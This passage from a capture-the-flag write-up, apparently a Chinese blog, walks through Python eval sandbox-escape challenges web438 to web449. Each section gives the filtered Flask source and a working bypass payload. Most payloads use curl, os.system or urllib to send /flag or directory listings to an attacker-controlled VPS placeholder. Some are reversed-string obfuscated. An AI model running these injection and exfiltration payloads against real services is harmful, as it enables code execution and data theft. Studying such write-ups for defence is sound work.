class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">Q2B</span>(<span class="params">uchar</span>):</span><br><span class="line">    inside_code = <span class="built_in">ord</span>(uchar)</span><br><span class="line">    <span class="keyword">if</span> inside_code == <span class="number">0x3000</span>:</span><br><span class="line">        inside_code = <span class="number">0x0020</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        inside_code -= <span class="number">0xfee0</span></span><br><span class="line">    <span class="keyword">if</span> inside_code &lt; <span class="number">0x0020</span> <span class="keyword">or</span> inside_code &gt; <span class="number">0x7e</span>: </span><br><span class="line">        <span class="keyword">return</span> uchar</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">chr</span>(inside_code)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">stringQ2B</span>(<span class="params">ustring</span>):</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;&quot;</span>.join([Q2B(uchar) <span class="keyword">for</span> uchar <span class="keyword">in</span> ustring])</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">app_index</span>():</span><br><span class="line">    code = request.args.get(<span class="string">&#x27;code&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> code:</span><br><span class="line">    code = stringQ2B(code)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;\\u&#x27;</span> <span class="keyword">in</span> code:</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;hacker?&#x27;</span></span><br><span class="line">    reg = re.<span class="built_in">compile</span>(<span class="string">r&#x27;os|open|system|read|eval|builtins|curl|_|getattr|&#123;&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> reg.search(code)==<span class="literal">None</span>:</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">eval</span>(code)</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;where is flag?&lt;!-- /?code --&gt;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__==<span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    app.run(host=<span class="string">&#x27;0.0.0.0&#x27;</span>,port=<span class="number">80</span>)</span><br></pre></td></tr></table></figure><p>这题比web437多过滤了<code>&#123;</code>，但这个符号我们用不到，所以不影响</p><p>payload：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?code=str(exec(&#x27;)&quot;`galf/ tac`=p?反转端口:你的反转vps地址//:ptth lruc&quot;(metsys.so ;so tropmi&#x27;[::-1]))</span><br></pre></td></tr></table></figure><p><img src="https://oss.waynejoons.icu/picphoto/20250824004807436.png"></p><h3 id="web439"><a href="#web439" class="headerlink" title="web439"></a>web439</h3><p>这题可以继续用上题的方法，我们把源码爆出来分析一下</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?code=str(exec(&#x27;)&quot;`yp.ppa 0 w- 46esab`=p?反转端口:你的反转vps地址//:ptth lruc&quot;(metsys.so ;so tropmi&#x27;[::-1]))</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> request</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">Q2B</span>(<span class="params">uchar</span>):</span><br><span class="line">    inside_code = <span class="built_in">ord</span>(uchar)</span><br><span class="line">    <span class="keyword">if</span> inside_code == <span class="number">0x3000</span>:</span><br><span class="line">        inside_code = <span class="number">0x0020</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        inside_code -= <span class="number">0xfee0</span></span><br><span class="line">    <span class="keyword">if</span> inside_code &lt; <span class="number">0x0020</span> <span class="keyword">or</span> inside_code &gt; <span class="number">0x7e</span>: </span><br><span class="line">        <span class="keyword">return</span> uchar</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">chr</span>(inside_code)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">stringQ2B</span>(<span class="params">ustring</span>):</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;&quot;</span>.join([Q2B(uchar) <span class="keyword">for</span> uchar <span class="keyword">in</span> ustring])</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">app_index</span>():</span><br><span class="line">    code = request.args.get(<span class="string">&#x27;code&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> code:</span><br><span class="line">    code = stringQ2B(code)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;\\u&#x27;</span> <span class="keyword">in</span> code:</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;hacker?&#x27;</span></span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;\\x&#x27;</span> <span class="keyword">in</span> code:</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;hacker?&#x27;</span></span><br><span class="line">    reg = re.<span class="built_in">compile</span>(<span class="string">r&#x27;os|open|system|read|eval|builtins|curl|_|getattr|&#123;&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> reg.search(code)==<span class="literal">None</span>:</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">eval</span>(code)</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;where is flag?&lt;!-- /?code --&gt;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__==<span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    app.run(host=<span class="string">&#x27;0.0.0.0&#x27;</span>,port=<span class="number">80</span>)</span><br></pre></td></tr></table></figure><p>可以看到这题比上题多过滤了<code>\x</code>，<code>\x</code> 是一种<strong>转义序列</strong>，用来表示十六进制形式的字符，比如 <code>\x41</code> 代表 ASCII 字符 <code>&#39;A&#39;</code></p><p>但是我们并没有用到这个，所以不影响</p><p>payload：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?code=str(exec(&#x27;)&quot;`galf/ tac`=p?反转端口:你的反转vps地址//:ptth lruc&quot;(metsys.so ;so tropmi&#x27;[::-1]))</span><br></pre></td></tr></table></figure><h3 id="web440"><a href="#web440" class="headerlink" title="web440"></a>web440</h3><p>这题把引号禁了，我们可以用<strong>chr构造字符串</strong>。先用ord返回unicode数值，然后再经过chr转换成字符即可，我们写个python脚本</p><p>payload：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">s = <span class="string">&quot;import os;os.system(&#x27;curl http://你的vps地址:端口?p=`ls`&#x27;)&quot;</span></span><br><span class="line">res = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> s:</span><br><span class="line">    res += <span class="string">f&quot;chr(<span class="subst">&#123;<span class="built_in">ord</span>(i)&#125;</span>)%2B&quot;</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;str(exec(&#x27;</span>+res[:-<span class="number">3</span>]+<span class="string">&#x27;))&#x27;</span>)</span><br></pre></td></tr></table></figure><p>把结果拼接到网站GET发送</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?code=你的代码运行结果</span><br></pre></td></tr></table></figure><p>修改命令为<code>cat /flag</code>获取flag即可</p><h3 id="web441"><a href="#web441" class="headerlink" title="web441"></a>web441</h3><p>经过分析，这题把加号过滤了，放出部分源码看看</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">re.<span class="built_in">compile</span>(<span class="string">r&#x27;os|open|system|read|eval|builtins|curl|_|getattr|&#123;|\&#x27;|&quot;|\+&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> reg.search(code)==<span class="literal">None</span>:</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">eval</span>(code)</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;where is flag?&lt;!-- /?code --&gt;&#x27;</span></span><br></pre></td></tr></table></figure><p>那我们用<strong>join函数</strong>来拼接字符即可，例如<code>.join([&#39;1&#39;,&#39;2&#39;,&#39;3&#39;])</code>，结果是 ‘123’。 <strong>join必须作为字符串的方法调用</strong>，即调用它的对象必须是字符串，所以前面要有字符串和点号（<code>.</code>）来调用该函数</p><p>payload：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">s = <span class="string">&quot;import os;os.system(&#x27;curl http://你的vps地址:端口?p=`ls`&#x27;)&quot;</span></span><br><span class="line">res = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> s:</span><br><span class="line">    res += <span class="string">f&quot;chr(<span class="subst">&#123;<span class="built_in">ord</span>(i)&#125;</span>),&quot;</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;exec(str().join([&#x27;</span>+res[:-<span class="number">1</span>]+<span class="string">&#x27;]))&#x27;</span>)</span><br></pre></td></tr></table></figure><p>把结果拼接到网站GET发送</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?code=你的代码运行结果</span><br></pre></td></tr></table></figure><p>修改命令为<code>cat /flag</code>获取flag即可</p><h3 id="web442"><a href="#web442" class="headerlink" title="web442"></a>web442</h3><p>这题把数字过滤了</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">re.<span class="built_in">compile</span>(<span class="string">r&#x27;os|open|system|read|eval|builtins|curl|_|getattr|&#123;|\&#x27;|&quot;|\+|[0-9]&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> reg.search(code)==<span class="literal">None</span>:</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">eval</span>(code)</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;where is flag?&lt;!-- /?code --&gt;&#x27;</span></span><br></pre></td></tr></table></figure><p>我们用<code>request.args.get</code>方法获取参数值即可。<code>request.args.get</code> 是 Flask 框架中获取 URL 查询参数（即 GET 请求中 URL 中 <code>?key=value</code> 部分参数）的方法</p><p>payload：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?code=str(exec(request.args.get(request.method)))&amp;GET=import os;os.system(&#x27;curl http://你的vps地址:端口?p=`cat /flag`&#x27;)</span><br></pre></td></tr></table></figure><h3 id="web443"><a href="#web443" class="headerlink" title="web443"></a>web443</h3><p>把request过滤了，关键代码如下</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">re.<span class="built_in">compile</span>(<span class="string">r&#x27;os|open|system|read|eval|builtins|curl|_|getattr|&#123;|\&#x27;|&quot;|\+|[0-9]|request&#x27;</span>)</span><br><span class="line">        <span class="keyword">if</span> reg.search(code)==<span class="literal">None</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">eval</span>(code)</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;where is flag?&lt;!-- /?code --&gt;&#x27;</span></span><br></pre></td></tr></table></figure><p>题目提示<strong>提交参数为POST</strong>，那我们后面用POST提交数据</p><p>这题我们可以继续用<code>request.args.get</code>，不过里面的<code>request</code>需要变换一下。我们打印全局变量出来看看</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">code=str(globals())</span><br></pre></td></tr></table></figure><p><img src="https://oss.waynejoons.icu/picphoto/20250826171726164.png"></p><p>可以看到里面有个键是<code>request</code>，我们要利用的就是这个。由于Python 中列表、元组、字符串等序列的索引是<strong>从 0 开始</strong>的，所以<code>request</code>所在的索引为10。又因为数字和加号被禁了，所以我们可以用<code>True</code>来表示1，用两个减号表示加号</p><p>因此10可以这么写</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="literal">True</span>-(-<span class="literal">True</span>)-(-<span class="literal">True</span>)-(-<span class="literal">True</span>)-(-<span class="literal">True</span>)-(-<span class="literal">True</span>)-(-<span class="literal">True</span>)-(-<span class="literal">True</span>)-(-<span class="literal">True</span>)-(-<span class="literal">True</span>)</span><br></pre></td></tr></table></figure><p>然后用<code>list(globals().keys())[]</code>来获取对应的键名，再放进<code>globals()[]</code>获取对应的属性和方法，从而调用<code>args.get()</code>获取参数值</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">globals</span>()[<span class="built_in">list</span>(<span class="built_in">globals</span>().keys())[<span class="literal">True</span>-(-<span class="literal">True</span>)-(-<span class="literal">True</span>)-(-<span class="literal">True</span>)-(-<span class="literal">True</span>)-(-<span class="literal">True</span>)-(-<span class="literal">True</span>)-(-<span class="literal">True</span>)-(-<span class="literal">True</span>)-(-<span class="literal">True</span>)]]</span><br></pre></td></tr></table></figure><p>可以把这个理解为<code>request</code>，那么<code>request.args.get(request.method)</code>就等于</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">globals</span>()[<span class="built_in">list</span>(<span class="built_in">globals</span>().keys())[<span class="literal">True</span>-(-<span class="literal">True</span>)-(-<span class="literal">True</span>)-(-<span class="literal">True</span>)-(-<span class="literal">True</span>)-(-<span class="literal">True</span>)-(-<span class="literal">True</span>)-(-<span class="literal">True</span>)-(-<span class="literal">True</span>)-(-<span class="literal">True</span>)]].args.get(<span class="built_in">globals</span>()[<span class="built_in">list</span>(<span class="built_in">globals</span>().keys())[<span class="literal">True</span>-(-<span class="literal">True</span>)-(-<span class="literal">True</span>)-(-<span class="literal">True</span>)-(-<span class="literal">True</span>)-(-<span class="literal">True</span>)-(-<span class="literal">True</span>)-(-<span class="literal">True</span>)-(-<span class="literal">True</span>)-(-<span class="literal">True</span>)]].method)</span><br></pre></td></tr></table></figure><p>然后在路径后面拼接参数POST，传入代码即可</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?POST=import os;os.system(&#x27;curl http://你的vps地址:端口?p=`ls`&#x27;)</span><br></pre></td></tr></table></figure><p>到这里，我们成功把代码弄好了，可以用str函数打印出来验证一下，POST传入</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">code=str(globals()[list(globals().keys())[True-(-True)-(-True)-(-True)-(-True)-(-True)-(-True)-(-True)-(-True)-(-True)]].args.get(globals()[list(globals().keys())[True-(-True)-(-True)-(-True)-(-True)-(-True)-(-True)-(-True)-(-True)-(-True)]].method))</span><br></pre></td></tr></table></figure><p><img src="https://oss.waynejoons.icu/picphoto/20250826174834988.png"></p><p>最后用exec函数运行代码即可</p><p>POST传入</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">code=str(exec(globals()[list(globals().keys())[True-(-True)-(-True)-(-True)-(-True)-(-True)-(-True)-(-True)-(-True)-(-True)]].args.get(globals()[list(globals().keys())[True-(-True)-(-True)-(-True)-(-True)-(-True)-(-True)-(-True)-(-True)-(-True)]].method)))</span><br></pre></td></tr></table></figure><p>GET传入</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?POST=import os;os.system(&#x27;curl http://你的vps地址:端口?p=`cat /flag`&#x27;)</span><br></pre></td></tr></table></figure><h3 id="web444"><a href="#web444" class="headerlink" title="web444"></a>web444</h3><p>这题的附件把代码给出来了</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> request</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">Q2B</span>(<span class="params">uchar</span>):</span><br><span class="line">    inside_code = <span class="built_in">ord</span>(uchar)</span><br><span class="line">    <span class="keyword">if</span> inside_code == <span class="number">0x3000</span>:</span><br><span class="line">        inside_code = <span class="number">0x0020</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        inside_code -= <span class="number">0xfee0</span></span><br><span class="line">    <span class="keyword">if</span> inside_code &lt; <span class="number">0x0020</span> <span class="keyword">or</span> inside_code &gt; <span class="number">0x7e</span>: </span><br><span class="line">        <span class="keyword">return</span> uchar</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">chr</span>(inside_code)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">stringQ2B</span>(<span class="params">ustring</span>):</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;&quot;</span>.join([Q2B(uchar) <span class="keyword">for</span> uchar <span class="keyword">in</span> ustring])</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span>,methods=[<span class="string">&#x27;POST&#x27;</span>, <span class="string">&#x27;GET&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">app_index</span>():</span><br><span class="line">    <span class="keyword">if</span> request.method == <span class="string">&#x27;POST&#x27;</span>:</span><br><span class="line">        code = request.form[<span class="string">&#x27;code&#x27;</span>]</span><br><span class="line">        <span class="keyword">if</span> code:</span><br><span class="line">        code = stringQ2B(code)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;\\u&#x27;</span> <span class="keyword">in</span> code:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;hacker?&#x27;</span></span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;\\x&#x27;</span> <span class="keyword">in</span> code:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;hacker?&#x27;</span></span><br><span class="line">        reg = re.<span class="built_in">compile</span>(<span class="string">r&#x27;os|open|system|read|eval|builtins|curl|_|getattr|&#123;|\&#x27;|&quot;|\+|[0-9]|request|len&#x27;</span>)</span><br><span class="line">        <span class="keyword">if</span> reg.search(code)==<span class="literal">None</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">eval</span>(code)</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;where is flag?&lt;!-- /?code --&gt;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__==<span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    app.run(host=<span class="string">&#x27;0.0.0.0&#x27;</span>,port=<span class="number">80</span>)</span><br></pre></td></tr></table></figure><p>这题把len过滤了，可以继续用上题的方法</p><p>POST传入</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">code=str(exec(globals()[list(globals().keys())[True-(-True)-(-True)-(-True)-(-True)-(-True)-(-True)-(-True)-(-True)-(-True)]].args.get(globals()[list(globals().keys())[True-(-True)-(-True)-(-True)-(-True)-(-True)-(-True)-(-True)-(-True)-(-True)]].method)))</span><br></pre></td></tr></table></figure><p>GET传入</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?POST=import os;os.system(&#x27;curl http://你的vps地址:端口?p=`cat /flag`&#x27;)</span><br></pre></td></tr></table></figure><h3 id="web445"><a href="#web445" class="headerlink" title="web445"></a>web445</h3><p>这题代码总体跟上题差不多，不过开头那里把<code>os.system</code>和<code>os.popen</code>去掉了</p><p><img src="https://oss.waynejoons.icu/picphoto/20250826182431328.png"></p><p>那直接调用肯定是不行的了，可以<strong>用reload函数重新加载os模块</strong>，然后再重新调用system函数</p><p>简单介绍一下<code>reload</code>，<code>reload</code> 是 Python 中用于<strong>重新加载已导入模块</strong>的函数。</p><p><strong>作用</strong></p><ul><li>Python 的模块在导入时会被缓存，后续再次导入同一模块时不会重新执行模块代码，而是直接使用缓存</li><li><code>reload</code> 函数可以让已经导入的模块重新执行代码，更新模块内容（相当于“刷新”模块），适合在开发或调试时修改代码后即时生效，而不需要重启程序</li></ul><p><strong>使用方法</strong></p><ul><li>Python 2 中 <code>reload()</code> 是内置函数，可以直接调用</li><li>Python 3 中，<code>reload()</code> 被移到 <code>importlib</code> 模块中，需要先导入使用</li></ul><p>我们POST传入</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">code=str(exec(globals()[list(globals().keys())[True-(-True)-(-True)-(-True)-(-True)-(-True)-(-True)-(-True)-(-True)-(-True)]].args.get(globals()[list(globals().keys())[True-(-True)-(-True)-(-True)-(-True)-(-True)-(-True)-(-True)-(-True)-(-True)]].method)))</span><br></pre></td></tr></table></figure><p>GET传入</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?POST=from importlib import reload;reload(os);os.system(&#x27;curl http://你的vps地址:端口?p=`cat /flag`&#x27;)</span><br></pre></td></tr></table></figure><p>成功得到flag</p><h3 id="web446"><a href="#web446" class="headerlink" title="web446"></a>web446</h3><p>这题相比上题把<code>imp.reload</code>函数去掉了</p><p><img src="https://oss.waynejoons.icu/picphoto/20250826184341423.png"></p><p><code>imp</code> 是 Python 早期用于动态加载模块的内置模块，在 Python 3.4 之后，<code>imp</code> 模块已被废弃，不再推荐使用，而是被更强大的 <code>importlib</code> 模块所取代</p><p>所以这题可以继续使用上题的方法</p><p>POST传入</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">code=str(exec(globals()[list(globals().keys())[True-(-True)-(-True)-(-True)-(-True)-(-True)-(-True)-(-True)-(-True)-(-True)]].args.get(globals()[list(globals().keys())[True-(-True)-(-True)-(-True)-(-True)-(-True)-(-True)-(-True)-(-True)-(-True)]].method)))</span><br></pre></td></tr></table></figure><p>GET传入</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?POST=from importlib import reload;reload(os);os.system(&#x27;curl http://你的vps地址:端口?p=`cat /flag`&#x27;)</span><br></pre></td></tr></table></figure><h3 id="web447"><a href="#web447" class="headerlink" title="web447"></a>web447</h3><p>对比一下代码</p><p><img src="https://oss.waynejoons.icu/picphoto/20250826190210524.png"></p><p>这题过滤了挺多东西，例如用于创建和管理子进程的<code>subprocess</code>模块和用于测量一小段代码执行时间的<code>timeit</code>模块，但是不影响我们用之前的方法</p><p>POST传入</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">code=str(exec(globals()[list(globals().keys())[True-(-True)-(-True)-(-True)-(-True)-(-True)-(-True)-(-True)-(-True)-(-True)]].args.get(globals()[list(globals().keys())[True-(-True)-(-True)-(-True)-(-True)-(-True)-(-True)-(-True)-(-True)-(-True)]].method)))</span><br></pre></td></tr></table></figure><p>GET传入</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?POST=from importlib import reload;reload(os);os.system(&#x27;curl http://你的vps地址:端口?p=`cat /flag`&#x27;)</span><br></pre></td></tr></table></figure><h3 id="web448"><a href="#web448" class="headerlink" title="web448"></a>web448</h3><p>对比一下代码</p><p><img src="https://oss.waynejoons.icu/picphoto/20250826223039408.png"></p><p>这题把好多模块都设置为None，<code>sys.modules</code> 是一个字典，<strong>记录了所有已加载的模块</strong>。键为模块名，值为模块对象</p><p>将 sys.modules[‘模块名’] 设为 None，可以让 Python 认为该模块已被加载，但实际值为 None。这会导致后续 import 该模块时，不再真正加载，而是返回 None（或者报错）</p><p>这时我们就不能用reload了，因为 Python 会在 <code>sys.modules</code> 里查找，发现值为 None，而不是模块对象，于是 import 或 reload 过程中会抛出 ModuleNotFoundError 异常</p><p>我们可以用<code>shutil</code>模块的copy函数把<code>os.py</code>复制到一个新文件下，然后重新导入新模块即可</p><p>POST传入</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">code=str(exec(globals()[list(globals().keys())[True-(-True)-(-True)-(-True)-(-True)-(-True)-(-True)-(-True)-(-True)-(-True)]].args.get(globals()[list(globals().keys())[True-(-True)-(-True)-(-True)-(-True)-(-True)-(-True)-(-True)-(-True)-(-True)]].method)))</span><br></pre></td></tr></table></figure><p>GET传入</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?POST=import shutil;shutil.copy(&#x27;/usr/local/lib/python3.8/os.py&#x27;,&#x27;a.py&#x27;);import a;a.system(&#x27;curl http://你的vps地址:端口?p=`cat /flag`&#x27;)</span><br></pre></td></tr></table></figure><h3 id="web449"><a href="#web449" class="headerlink" title="web449"></a>web449</h3><p>这题把<code>sys</code>模块和<code>importlib</code>模块都禁用了，而且还删除了<code>sys</code>模块。之前的方法用不了</p><p><img src="https://oss.waynejoons.icu/picphoto/20250827110015032.png"></p><p>我们可以用<code>urllib</code>模块来发送网络请求，带出flag。urllib 是 Python 的一个标准库模块，用于<strong>处理和操作网页 URL</strong>，以及通过网络请求获取网页内容等功能。</p><p><strong>主要功能</strong></p><ul><li><strong>urllib.request</strong>：用于打开和读取 URL，发送 HTTP&#x2F;HTTPS 请求，并获取响应内容</li><li><strong>urllib.error</strong>：包含 urllib.request 相关的异常处理，如请求失败时的错误</li><li><strong>urllib.parse</strong>：用于解析 URL，包括分解和构造 URL 的各个部分</li><li><strong>urllib.robotparser</strong>：解析和处理网站的 robots.txt 文件，判断哪些网页允许爬取</li></ul><p>POST传入</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">code=str(exec(globals()[list(globals().keys())[True-(-True)-(-True)-(-True)-(-True)-(-True)-(-True)-(-True)-(-True)-(-True)]].args.get(globals()[list(globals().keys())[True-(-True)-(-True)-(-True)-(-True)-(-True)-(-True)-(-True)-(-True)-(-True)]].method)))</span><br></pre></td></tr></table></figure><p>GET传入</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?POST=a=open(&#x27;/flag&#x27;).read();from urllib.request import urlopen;urlopen(&#x27;http://你的vps地址:端口?p=&#x27;%2Ba)</span><br></pre></td></tr></table></figure><p><code>%2B</code>表示加号，如果直接写加号会无法解析，需要先URL编码</p><p><img src="https://oss.waynejoons.icu/picphoto/20250827110432723.png"></p><h3 id="web450"><a href="#web450" class="headerlink" title="web450"></a>web450</h3><p><img src="https://oss.waynejoons.icu/picphoto/20250827110751638.png"></p><p>题目说执行<code>phpinfo</code>就可以拿到flag，看代码可知我们只要满足这个正则匹配即可执行代码，我们简单分析一下</p><ul><li><code>^</code> 和 <code>$</code> 是锚点，表示匹配字符串的开始和结束</li><li><code>[a-z]+</code> 表示匹配一个或多个小写英文字母</li><li><code>[\^]</code> 